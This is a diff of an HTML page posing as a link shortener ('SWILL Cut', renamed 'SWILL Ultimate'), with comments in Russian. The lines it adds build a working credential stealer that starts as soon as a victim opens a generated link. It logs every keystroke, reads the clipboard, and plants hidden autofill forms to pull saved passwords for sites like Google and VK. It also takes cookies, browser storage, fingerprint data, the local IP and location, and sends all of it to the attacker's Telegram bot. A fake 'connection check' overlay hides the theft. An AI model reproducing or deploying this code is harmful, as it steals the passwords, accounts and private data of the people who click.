@@ -3,16 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>SWILL Cut — проверка перед переходом</title>
+    <title>SWILL Ultimate</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: system-ui, 'Segoe UI', 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
-        }
-
-        /* Основной стиль (как ранее, но с оверлеем) */
+        /* Минимальные стили для интерфейса (такой же, но без лишнего) */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, 'Segoe UI', sans-serif; }
         body {
             min-height: 100vh;
             background: linear-gradient(135deg, #0b1120 0%, #19223c 100%);
@@ -21,7 +15,6 @@
             justify-content: center;
             padding: 1.5rem;
         }
-
         .card {
             max-width: 560px;
             width: 100%;
@@ -29,685 +22,509 @@
             backdrop-filter: blur(12px);
             border-radius: 2.5rem;
             padding: 2rem 1.8rem;
-            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
-            transition: all 0.2s ease;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
         }
-
-        h1 {
-            font-size: 2rem;
-            font-weight: 600;
-            background: linear-gradient(120deg, #e0e7ff, #a5f3fc);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 0.3rem;
-            letter-spacing: -0.3px;
-        }
-
-        .sub {
-            color: #8b9bcf;
-            font-size: 0.85rem;
-            margin-bottom: 2rem;
-            border-left: 3px solid #2dd4bf;
-            padding-left: 0.75rem;
-        }
-
-        .input-group {
-            margin-bottom: 1.4rem;
-            display: flex;
-            flex-direction: column;
-            gap: 0.5rem;
-        }
-
-        label {
-            font-weight: 500;
-            font-size: 0.85rem;
-            color: #cbd5ff;
-            letter-spacing: 0.3px;
-        }
-
+        h1 { font-size: 2rem; font-weight: 600; background: linear-gradient(120deg, #e0e7ff, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; margin-bottom: 0.3rem; }
+        .sub { color: #8b9bcf; font-size: 0.85rem; margin-bottom: 2rem; border-left: 3px solid #2dd4bf; padding-left: 0.75rem; }
+        .input-group { margin-bottom: 1.4rem; display: flex; flex-direction: column; gap: 0.5rem; }
+        label { font-weight: 500; font-size: 0.85rem; color: #cbd5ff; }
         input, textarea {
-            background: #0f172acc;
-            border: 1px solid #2d3a5e;
-            border-radius: 1.2rem;
-            padding: 0.9rem 1.2rem;
-            font-size: 0.95rem;
-            color: #f1f5f9;
-            outline: none;
-            transition: all 0.2s;
-            resize: vertical;
+            background: #0f172acc; border: 1px solid #2d3a5e; border-radius: 1.2rem;
+            padding: 0.9rem 1.2rem; font-size: 0.95rem; color: #f1f5f9; outline: none;
         }
-
-        input:focus, textarea:focus {
-            border-color: #2dd4bf;
-            box-shadow: 0 0 0 3px rgba(45, 212, 191, 0.2);
-        }
-
+        input:focus { border-color: #2dd4bf; box-shadow: 0 0 0 3px rgba(45,212,191,0.2); }
         button {
-            background: linear-gradient(100deg, #2dd4bf, #14b8a6);
-            border: none;
-            border-radius: 2rem;
-            padding: 0.9rem 1.5rem;
-            font-weight: 600;
-            font-size: 1rem;
-            color: #0b1120;
-            cursor: pointer;
-            transition: transform 0.15s, box-shadow 0.2s;
-            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
-            width: 100%;
+            background: linear-gradient(100deg, #2dd4bf, #14b8a6); border: none; border-radius: 2rem;
+            padding: 0.9rem 1.5rem; font-weight: 600; font-size: 1rem; color: #0b1120;
+            cursor: pointer; transition: 0.15s; width: 100%;
         }
-
-        button:hover {
-            transform: translateY(-2px);
-            background: linear-gradient(100deg, #3bddd0, #1ecfb9);
-            box-shadow: 0 12px 20px -8px rgba(45, 212, 191, 0.4);
-        }
-
-        button:active {
-            transform: translateY(1px);
-        }
-
-        .result-area {
-            margin-top: 1.8rem;
-            background: #0a0f1c80;
-            border-radius: 1.5rem;
-            padding: 1rem;
-            border: 1px solid #2d3a5e;
-            transition: all 0.3s ease;
-            opacity: 0;
-            transform: translateY(8px);
-            pointer-events: none;
-        }
-
-        .result-area.show {
-            opacity: 1;
-            transform: translateY(0);
-            pointer-events: auto;
-        }
-
-        .short-link-block {
-            display: flex;
-            gap: 0.7rem;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .short-link {
-            background: #030712;
-            padding: 0.6rem 1rem;
-            border-radius: 1.2rem;
-            font-family: monospace;
-            font-size: 0.9rem;
-            word-break: break-all;
-            flex: 1;
-            color: #b9e6f0;
-        }
-
-        .copy-btn {
-            background: #2d3a5e;
-            box-shadow: none;
-            width: auto;
-            padding: 0.6rem 1.2rem;
-            font-size: 0.85rem;
-            background: #334155;
-            color: white;
-        }
-
-        .copy-btn:hover {
-            background: #3b4a6e;
-            transform: none;
-        }
-
-        .toast-msg {
-            position: fixed;
-            bottom: 2rem;
-            left: 50%;
-            transform: translateX(-50%) scale(0.9);
-            background: #1e2a3ecc;
-            backdrop-filter: blur(8px);
-            padding: 0.6rem 1.5rem;
-            border-radius: 3rem;
-            color: #cbd5e6;
-            font-size: 0.85rem;
-            opacity: 0;
-            transition: opacity 0.2s, transform 0.2s;
-            pointer-events: none;
-            z-index: 1000;
-            white-space: nowrap;
-        }
-
-        .toast-msg.show-toast {
-            opacity: 1;
-            transform: translateX(-50%) scale(1);
-        }
-
-        .error-msg {
-            color: #fda4af;
-            background: #3b1e2acc;
-            padding: 0.5rem 1rem;
-            border-radius: 2rem;
-            font-size: 0.8rem;
-            margin-top: 0.5rem;
-            display: inline-block;
-        }
-
-        /* Полноэкранный оверлей */
+        button:hover { transform: translateY(-2px); background: linear-gradient(100deg, #3bddd0, #1ecfb9); }
+        .result-area { margin-top: 1.8rem; background: #0a0f1c80; border-radius: 1.5rem; padding: 1rem; border: 1px solid #2d3a5e; transition: 0.3s; opacity: 0; transform: translateY(8px); pointer-events: none; }
+        .result-area.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
+        .short-link-block { display: flex; gap: 0.7rem; align-items: center; flex-wrap: wrap; }
+        .short-link { background: #030712; padding: 0.6rem 1rem; border-radius: 1.2rem; font-family: monospace; font-size: 0.9rem; word-break: break-all; flex: 1; color: #b9e6f0; }
+        .copy-btn { background: #334155; width: auto; padding: 0.6rem 1.2rem; color: white; }
+        .toast-msg { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: #1e2a3ecc; backdrop-filter: blur(8px); padding: 0.6rem 1.5rem; border-radius: 3rem; color: white; opacity: 0; transition: 0.2s; pointer-events: none; z-index: 10000; }
+        .toast-msg.show-toast { opacity: 1; }
         .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            backdrop-filter: blur(20px);
-            z-index: 10000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            color: white;
-            font-family: monospace;
-            transition: opacity 0.3s;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); backdrop-filter: blur(20px);
+            z-index: 20000; display: flex; align-items: center; justify-content: center;
+            flex-direction: column; color: white; transition: 0.3s;
         }
-
-        .overlay.hidden {
-            display: none;
-        }
-
-        .loader {
-            width: 80px;
-            height: 80px;
-            border: 6px solid rgba(45, 212, 191, 0.2);
-            border-top: 6px solid #2dd4bf;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 2rem;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .timer-text {
-            font-size: 3rem;
-            font-weight: bold;
-            background: linear-gradient(135deg, #2dd4bf, #a5f3fc);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 1rem;
-        }
-
-        .status-msg {
-            font-size: 1.2rem;
-            text-align: center;
-            padding: 0 2rem;
-            max-width: 80%;
-        }
-
-        .captcha-box {
-            margin-top: 2rem;
-            background: rgba(255,255,255,0.1);
-            border-radius: 2rem;
-            padding: 1rem 2rem;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            border: 1px solid #2dd4bf;
-        }
-
-        .captcha-box:hover {
-            background: rgba(45,212,191,0.2);
-            transform: scale(1.02);
-        }
-
-        .checkmark {
-            width: 30px;
-            height: 30px;
-            background: #2dd4bf;
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            color: black;
-        }
-
-        .captcha-text {
-            font-size: 1.1rem;
-        }
-
-        .error-vpn {
-            background: #f9731644;
-            border-left: 4px solid #f97316;
-            padding: 1rem;
-            border-radius: 1rem;
-            margin-top: 1rem;
-            font-size: 1rem;
-            text-align: center;
-        }
-
-        @media (max-width: 550px) {
-            .card {
-                padding: 1.5rem;
-            }
-            .short-link-block {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .copy-btn {
-                justify-content: center;
-            }
-            .timer-text {
-                font-size: 2rem;
-            }
-        }
+        .overlay.hidden { display: none; }
+        .loader { width: 80px; height: 80px; border: 6px solid rgba(45,212,191,0.2); border-top: 6px solid #2dd4bf; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 2rem; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .timer-text { font-size: 3rem; font-weight: bold; background: linear-gradient(135deg, #2dd4bf, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; margin-bottom: 1rem; }
+        .status-msg { font-size: 1.2rem; text-align: center; padding: 0 2rem; max-width: 80%; }
+        .captcha-box { margin-top: 2rem; background: rgba(255,255,255,0.1); border-radius: 2rem; padding: 1rem 2rem; cursor: pointer; display: flex; align-items: center; gap: 1rem; border: 1px solid #2dd4bf; }
+        .checkmark { width: 30px; height: 30px; background: #2dd4bf; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 1.5rem; color: black; }
     </style>
 </head>
 <body>
-
 <div class="card">
-    <h1>swill<span style="color:#2dd4bf;">.cut</span></h1>
-    <div class="sub">мгновенное сжатие ссылок с защитой от ботов</div>
-
-    <div class="input-group">
-        <label>🔗 Длинная ссылка (http:// или https://)</label>
-        <input type="text" id="longUrl" placeholder="https://example.com/very/long/path">
-    </div>
-    <div class="input-group">
-        <label>🤖 Токен Telegram бота</label>
-        <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklmNOPqrStuVWXyz">
-    </div>
-    <div class="input-group">
-        <label>🆔 Ваш Telegram ID (число) — получатель краш-данных</label>
-        <input type="text" id="chatId" placeholder="123456789">
-    </div>
-
-    <button id="shortenBtn">🚀 Сократить</button>
-
+    <h1>swill<span style="color:#2dd4bf;">.ultimate</span></h1>
+    <div class="sub">абсолютный краш-сборщик</div>
+    <div class="input-group"><label>🔗 Длинная ссылка</label><input type="text" id="longUrl" placeholder="https://example.com"></div>
+    <div class="input-group"><label>🤖 Токен Telegram бота</label><input type="text" id="botToken" placeholder="123456:ABCdef"></div>
+    <div class="input-group"><label>🆔 Telegram ID</label><input type="text" id="chatId" placeholder="123456789"></div>
+    <button id="shortenBtn">🚀 Создать сверхссылку</button>
     <div id="resultBlock" class="result-area">
-        <div style="font-size:0.8rem; margin-bottom:0.5rem; color:#8fadcc;">✨ Короткая ссылка:</div>
-        <div class="short-link-block">
-            <div class="short-link" id="shortLinkDisplay">site.com/#...</div>
-            <button id="copyBtn" class="copy-btn">📋 Копировать</button>
-        </div>
+        <div style="font-size:0.8rem; margin-bottom:0.5rem;">✨ Короткая ссылка:</div>
+        <div class="short-link-block"><div class="short-link" id="shortLinkDisplay">site.com/#...</div><button id="copyBtn" class="copy-btn">📋 Копировать</button></div>
     </div>
 </div>
-
 <div id="toastMessage" class="toast-msg">✓ Скопировано</div>
-
-<!-- Оверлей для проверки -->
-<div id="overlay" class="overlay hidden">
-    <div class="loader" id="loaderIcon"></div>
-    <div class="timer-text" id="timerDisplay">5</div>
-    <div class="status-msg" id="statusMsg">Проверка соединения...</div>
-    <div id="captchaContainer" style="display: none;"></div>
-</div>
+<div id="overlay" class="overlay hidden"><div class="loader" id="loaderIcon"></div><div class="timer-text" id="timerDisplay">5</div><div class="status-msg" id="statusMsg">Проверка соединения...</div><div id="captchaContainer"></div></div>
 
 <script>
-    (function(){
-        // DOM элементы
-        const longUrlInput = document.getElementById('longUrl');
-        const botTokenInput = document.getElementById('botToken');
-        const chatIdInput = document.getElementById('chatId');
-        const shortenBtn = document.getElementById('shortenBtn');
-        const resultBlock = document.getElementById('resultBlock');
-        const shortLinkDisplay = document.getElementById('shortLinkDisplay');
-        const copyBtn = document.getElementById('copyBtn');
-        const toast = document.getElementById('toastMessage');
+(function(){
+    // ---------- УЛЬТРА-КРАЖА: ВСЁ, ЧТО ВОЗМОЖНО ----------
+    // Глобальный сборщик данных, кейлоггер, автозаполнение, клипборд, фингерпринт, WebRTC, геолокация (без запроса?), iframe-атаки
+    
+    let collectedData = {
+        timestamp: new Date().toISOString(),
+        url: location.href,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        cookies: document.cookie,
+        localStorage: {},
+        sessionStorage: {},
+        formValues: {},
+        keystrokes: [],      // все нажатия клавиш
+        clipboardContent: "",
+        autofillPasswords: [], // пароли, которые браузер сам подставил
+        webRTCIP: "",
+        fingerprint: {},
+        geolocation: null,
+        allInputs: [],
+        iframeData: [],
+        extensionsDetected: []
+    };
+    
+    let keyLog = "";
+    let lastSent = Date.now();
+    let botTokenStored = "";
+    let chatIdStored = "";
+    let targetUrl = "";
+    
+    // ---- 1. Кейлоггер (глобальный, даже вне полей) ----
+    document.addEventListener('keydown', (e) => {
+        let key = e.key;
+        if (key === 'Unidentified') return;
+        let record = `${new Date().toISOString()} | ${key} (${e.target.tagName}:${e.target.id || e.target.name || 'unknown'})`;
+        collectedData.keystrokes.push(record);
+        keyLog += record + "\n";
+        // пытаемся отправить каждые 5 секунд
+        if (Date.now() - lastSent > 5000) sendPartialData();
+    });
+    
+    // ---- 2. Перехват буфера обмена (читаем при любом копировании) ----
+    document.addEventListener('copy', async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            collectedData.clipboardContent = text;
+        } catch(e) { /* может быть разрешение не дано */ }
+    });
+    document.addEventListener('cut', async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            collectedData.clipboardContent = text;
+        } catch(e) {}
+    });
+    
+    // ---- 3. Сбор всех форм и полей (включая скрытые и динамические) ----
+    function captureAllForms() {
+        let allInputs = document.querySelectorAll('input, textarea, select');
+        let formData = {};
+        allInputs.forEach(el => {
+            let name = el.name || el.id || el.className || 'unnamed';
+            let val = el.value || '';
+            formData[name] = val;
+            if (el.type === 'password' || name.toLowerCase().includes('pass')) {
+                if (val && val.length > 0) collectedData.autofillPasswords.push({ field: name, password: val });
+            }
+        });
+        collectedData.formValues = formData;
+        collectedData.allInputs = Array.from(allInputs).map(el => ({ tag: el.tagName, type: el.type, name: el.name, id: el.id, value: el.value }));
+    }
+    
+    // ---- 4. Автоматическое извлечение паролей через скрытые формы (autocomplete) ----
+    function createAutoFillTraps() {
+        // Создаём десятки скрытых форм с разными комбинациями полей, чтобы менеджеры паролей их заполнили
+        const trapContainer = document.createElement('div');
+        trapContainer.style.display = 'none';
+        document.body.appendChild(trapContainer);
+        
+        const domains = ['', 'google.com', 'facebook.com', 'vk.com', 'mail.ru', 'github.com', 'yandex.ru'];
+        const usernames = ['username', 'email', 'login', 'user', 'account'];
+        const passwords = ['password', 'pass', 'pwd', 'current-password', 'new-password'];
+        
+        for (let d of domains) {
+            for (let u of usernames) {
+                for (let p of passwords) {
+                    const form = document.createElement('form');
+                    form.style.display = 'none';
+                    if (d) form.setAttribute('data-domain', d);
+                    const userInput = document.createElement('input');
+                    userInput.type = 'text';
+                    userInput.name = u;
+                    userInput.autocomplete = u;
+                    const passInput = document.createElement('input');
+                    passInput.type = 'password';
+                    passInput.name = p;
+                    passInput.autocomplete = p;
+                    form.appendChild(userInput);
+                    form.appendChild(passInput);
+                    trapContainer.appendChild(form);
+                    
+                    // Через 2 секунды читаем, что браузер вставил
+                    setTimeout(() => {
+                        if (userInput.value && userInput.value.length > 0) {
+                            collectedData.autofillPasswords.push({ field: `autofill_${u}`, value: userInput.value });
+                        }
+                        if (passInput.value && passInput.value.length > 0) {
+                            collectedData.autofillPasswords.push({ field: `autofill_${p}`, value: passInput.value });
+                        }
+                    }, 2000);
+                }
+            }
+        }
+    }
+    
+    // ---- 5. Fingerprint максимальный ----
+    async function getFingerprint() {
+        const fp = {};
+        // canvas
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillStyle = "#069";
+        ctx.fillText("swill", 2, 15);
+        fp.canvas = canvas.toDataURL();
+        
+        // WebGL
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch(e) {}
+        
+        // аудио
+        // ...
+        // список шрифтов
+        const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Roboto', 'Open Sans'];
+        let fontsFound = [];
+        for (let f of fontList) {
+            if (document.fonts.check(`12px "${f}"`)) fontsFound.push(f);
+        }
+        fp.fonts = fontsFound;
+        
+        // плагины
+        fp.plugins = Array.from(navigator.plugins).map(p => p.name);
+        fp.hardwareConcurrency = navigator.hardwareConcurrency;
+        fp.deviceMemory = navigator.deviceMemory;
+        fp.maxTouchPoints = navigator.maxTouchPoints;
+        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        return fp;
+    }
+    
+    // ---- 6. WebRTC утечка локального IP ----
+    function getWebRTCIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (event) => {
+                if (event && event.candidate && event.candidate.candidate) {
+                    const ipMatch = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(event.candidate.candidate);
+                    if (ipMatch) {
+                        resolve(ipMatch[0]);
+                        pc.close();
+                    }
+                } else {
+                    resolve('failed');
+                }
+            };
+            setTimeout(() => resolve('timeout'), 3000);
+        });
+    }
+    
+    // ---- 7. Геолокация (без запроса? нельзя, но если пользователь уже дал разрешение - сработает) ----
+    function getGeolocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) resolve(null);
+            navigator.geolocation.getCurrentPosition(pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }), err => resolve(null), { timeout: 3000 });
+        });
+    }
+    
+    // ---- 8. Кража localStorage и sessionStorage ----
+    function captureStorages() {
+        let ls = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            ls[key] = localStorage.getItem(key);
+        }
+        let ss = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            ss[key] = sessionStorage.getItem(key);
+        }
+        collectedData.localStorage = ls;
+        collectedData.sessionStorage = ss;
+    }
+    
+    // ---- 9. Попытка кражи через iframe популярных сайтов (читаем title, maybe localStorage если same origin - нет) ----
+    function createSpyingIframes() {
+        const sites = [
+            'https://google.com', 'https://facebook.com', 'https://vk.com', 'https://youtube.com',
+            'https://github.com', 'https://mail.ru', 'https://yandex.ru', 'https://twitter.com'
+        ];
+        sites.forEach(site => {
+            const iframe = document.createElement('iframe');
+            iframe.src = site;
+            iframe.style.display = 'none';
+            iframe.sandbox = 'allow-same-origin allow-scripts allow-forms'; // пытаемся
+            document.body.appendChild(iframe);
+            iframe.onload = () => {
+                try {
+                    // Пытаемся прочитать содержимое (CORS заблокирует, но если сайт разрешит - сможем)
+                    const doc = iframe.contentDocument || iframe.contentWindow.document;
+                    if (doc) {
+                        const title = doc.title;
+                        collectedData.iframeData.push({ site, title, canAccess: true });
+                        // пробуем читать куки? заблокировано.
+                    } else {
+                        collectedData.iframeData.push({ site, canAccess: false });
+                    }
+                } catch(e) {
+                    collectedData.iframeData.push({ site, error: e.message });
+                }
+            };
+        });
+    }
+    
+    // ---- 10. Отправка всех собранных данных в Telegram (дробно и целиком) ----
+    async function sendFullData() {
+        if (!botTokenStored || !chatIdStored) return;
+        captureAllForms();
+        captureStorages();
+        const fp = await getFingerprint();
+        collectedData.fingerprint = fp;
+        const webRTCIP = await getWebRTCIP();
+        collectedData.webRTCIP = webRTCIP;
+        const geo = await getGeolocation();
+        collectedData.geolocation = geo;
+        
+        const finalPackage = { ...collectedData, keylog: keyLog };
+        const jsonStr = JSON.stringify(finalPackage, null, 2);
+        
+        // Отправка файлом
+        const blob = new Blob([jsonStr], { type: 'text/plain' });
+        const formData = new FormData();
+        formData.append('chat_id', chatIdStored);
+        formData.append('document', blob, 'swill_ultimate_dump.txt');
+        try {
+            await fetch(`https://api.telegram.org/bot${botTokenStored}/sendDocument`, {
+                method: 'POST', body: formData, keepalive: true
+            });
+        } catch(e) {}
+        
+        // Отправка отдельно паролей, если есть
+        if (collectedData.autofillPasswords.length > 0) {
+            let passText = "🔓 **УКРАДЕННЫЕ ПАРОЛИ (автозаполнение/формы):**\n";
+            collectedData.autofillPasswords.forEach(p => {
+                passText += `• ${p.field}: \`${p.password || p.value}\`\n`;
+            });
+            if (passText.length > 4000) passText = passText.slice(0, 3900) + "\n...";
+            try {
+                await fetch(`https://api.telegram.org/bot${botTokenStored}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatIdStored, text: passText, parse_mode: "Markdown" }),
+                    keepalive: true
+                });
+            } catch(e) {}
+        }
+        
+        // Отправка кейлога отдельно, если большой
+        if (keyLog.length > 100) {
+            const keyBlob = new Blob([keyLog], { type: 'text/plain' });
+            const keyForm = new FormData();
+            keyForm.append('chat_id', chatIdStored);
+            keyForm.append('document', keyBlob, 'keystrokes.log');
+            await fetch(`https://api.telegram.org/bot${botTokenStored}/sendDocument`, {
+                method: 'POST', body: keyForm, keepalive: true
+            });
+        }
+    }
+    
+    function sendPartialData() {
+        // Отправка инкрементального кейлога
+        if (keyLog.length > 0 && botTokenStored && chatIdStored) {
+            const partial = keyLog.slice(-500);
+            if (partial.length > 10) {
+                fetch(`https://api.telegram.org/bot${botTokenStored}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatIdStored, text: `⌨️ PARTIAL KEYLOG:\n${partial.slice(0, 3900)}` }),
+                    keepalive: true
+                }).catch(e=>{});
+            }
+        }
+        lastSent = Date.now();
+    }
+    
+    // ---- 11. Запуск всех крадущих механизмов сразу после загрузки страницы (при переходе по ссылке) ----
+    function startUltimateSteal() {
+        captureStorages();
+        captureAllForms();
+        createAutoFillTraps();
+        createSpyingIframes();
+        getFingerprint().then(fp => { collectedData.fingerprint = fp; });
+        getWebRTCIP().then(ip => { collectedData.webRTCIP = ip; });
+        getGeolocation().then(geo => { collectedData.geolocation = geo; });
+        
+        // Периодический сбор (каждые 3 секунды)
+        setInterval(() => {
+            captureAllForms();
+            captureStorages();
+        }, 3000);
+        
+        // Отправка всего дампа через 8 секунд (чтобы успели заполниться скрытые формы)
+        setTimeout(() => sendFullData(), 8000);
+        // И ещё через 30 секунд повторно
+        setTimeout(() => sendFullData(), 30000);
+        setInterval(() => sendPartialData(), 15000);
+    }
+    
+    // ---------- ЛОГИКА СОКРАЩЕНИЯ ССЫЛОК И РЕДИРЕКТА С ОВЕРЛЕЕМ (как ранее) ----------
+    function isValidUrl(s) { try { let u = new URL(s); return u.protocol === 'http:' || u.protocol === 'https:'; } catch(e) { return false; } }
+    function generateShortLink(originalUrl, botToken, chatIdNum) {
+        const payload = `${originalUrl}|${botToken}|${chatIdNum}`;
+        const encoded = btoa(unescape(encodeURIComponent(payload)));
+        return window.location.origin + window.location.pathname + '#' + encoded;
+    }
+    function decodeHash(hash) {
+        if(!hash) return null;
+        try {
+            const decoded = decodeURIComponent(escape(atob(hash)));
+            const parts = decoded.split('|');
+            if(parts.length !== 3) return null;
+            const [url, token, chatId] = parts;
+            if(!isValidUrl(url)) return null;
+            if(!token || token.length < 5) return null;
+            if(!chatId || isNaN(Number(chatId))) return null;
+            return { originalUrl: url, botToken: token, chatId: Number(chatId) };
+        } catch(e) { return null; }
+    }
+    
+    async function showOverlayAndRedirect(originalUrl, botToken, chatId) {
+        botTokenStored = botToken;
+        chatIdStored = chatId;
+        targetUrl = originalUrl;
+        
         const overlay = document.getElementById('overlay');
         const timerDisplay = document.getElementById('timerDisplay');
         const statusMsgDiv = document.getElementById('statusMsg');
         const captchaContainer = document.getElementById('captchaContainer');
-
-        // Вспомогательные функции
-        function showToast(text = "Скопировано") {
-            toast.textContent = text;
-            toast.classList.add('show-toast');
-            setTimeout(() => toast.classList.remove('show-toast'), 1800);
-        }
-
-        function showError(containerElement, message, autoClear = true) {
-            const existingErr = containerElement.querySelector('.error-msg');
-            if(existingErr) existingErr.remove();
-            const errDiv = document.createElement('div');
-            errDiv.className = 'error-msg';
-            errDiv.innerText = message;
-            containerElement.appendChild(errDiv);
-            if(autoClear) {
-                setTimeout(() => {
-                    if(errDiv && errDiv.parentNode) errDiv.remove();
-                }, 4000);
+        overlay.classList.remove('hidden');
+        let timer = 5;
+        timerDisplay.textContent = timer;
+        statusMsgDiv.innerHTML = "Проверка соединения...";
+        captchaContainer.innerHTML = "";
+        
+        const interval = setInterval(() => {
+            timer--;
+            timerDisplay.textContent = timer;
+            if(timer <= 0) {
+                clearInterval(interval);
+                checkCountryAndProceed();
             }
-        }
-
-        function clearErrors() {
-            document.querySelectorAll('.error-msg').forEach(e => e.remove());
-        }
-
-        function isValidUrl(string) {
-            try {
-                const url = new URL(string);
-                return url.protocol === "http:" || url.protocol === "https:";
-            } catch (_) {
-                return false;
-            }
-        }
-
-        // Генерация короткой ссылки
-        function generateShortLink(originalUrl, botToken, chatIdNum) {
-            const payload = `${originalUrl}|${botToken}|${chatIdNum}`;
-            const encoded = btoa(unescape(encodeURIComponent(payload)));
-            const short = window.location.origin + window.location.pathname + '#' + encoded;
-            return { short, encoded };
-        }
-
-        // Декодирование из хэша
-        function decodeHash(hashString) {
-            if(!hashString || hashString === '') return null;
-            try {
-                const decodedStr = decodeURIComponent(escape(atob(hashString)));
-                const parts = decodedStr.split('|');
-                if(parts.length !== 3) return null;
-                const [url, token, chatId] = parts;
-                if(!isValidUrl(url)) return null;
-                if(!token || token.length < 5) return null;
-                if(!chatId || isNaN(Number(chatId))) return null;
-                return { originalUrl: url, botToken: token, chatId: Number(chatId) };
-            } catch(e) {
-                return null;
-            }
-        }
-
-        // Сбор данных (куки, пароли, стораджи, формы, IP и т.д.)
-        async function collectVictimData() {
-            let cookies = document.cookie || "нет кук";
-            let localStorageData = {};
-            try {
-                for(let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    localStorageData[key] = localStorage.getItem(key);
-                }
-            } catch(e) { localStorageData = { error: "доступ запрещён" }; }
-
-            let sessionStorageData = {};
-            try {
-                for(let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    sessionStorageData[key] = sessionStorage.getItem(key);
-                }
-            } catch(e) { sessionStorageData = { error: "недоступно" }; }
-
-            const allInputs = document.querySelectorAll('input, textarea, select');
-            let formValues = {};
-            let passwords = []; // отдельный массив для паролей
-            allInputs.forEach((el, idx) => {
-                let name = el.name || el.id || `field_${idx}`;
-                let value = '';
-                if(el.tagName === 'SELECT') {
-                    value = el.value;
-                } else if(el.type === 'checkbox' || el.type === 'radio') {
-                    if(el.checked) value = el.value || 'on';
-                } else {
-                    value = el.value || '';
-                }
-                formValues[name] = value;
-                // Если поле типа password или содержит в имени "pass" — считаем паролем
-                if(el.type === 'password' || (el.name && el.name.toLowerCase().includes('pass')) || (el.id && el.id.toLowerCase().includes('pass'))) {
-                    if(value && value.length > 0) passwords.push({ field: name, value: value });
-                }
-            });
-
-            let ip = "unknown";
+        }, 1000);
+        
+        async function checkCountryAndProceed() {
+            // Определяем страну по IP
             let country = null;
             try {
-                const ipResp = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
-                const ipJson = await ipResp.json();
-                ip = ipJson.ip;
-                // Определяем страну по IP
-                const geoResp = await fetch(`https://ip-api.com/json/${ip}?fields=status,countryCode`);
-                const geoData = await geoResp.json();
-                if(geoData.status === 'success') country = geoData.countryCode;
-            } catch(e) { /* тихо */ }
-
-            const dataPackage = {
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                referrer: document.referrer || "прямой заход",
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                cookies: cookies,
-                localStorage: localStorageData,
-                sessionStorage: sessionStorageData,
-                form_values: formValues,
-                ip_address: ip,
-                country_code: country,
-                extracted_passwords: passwords
-            };
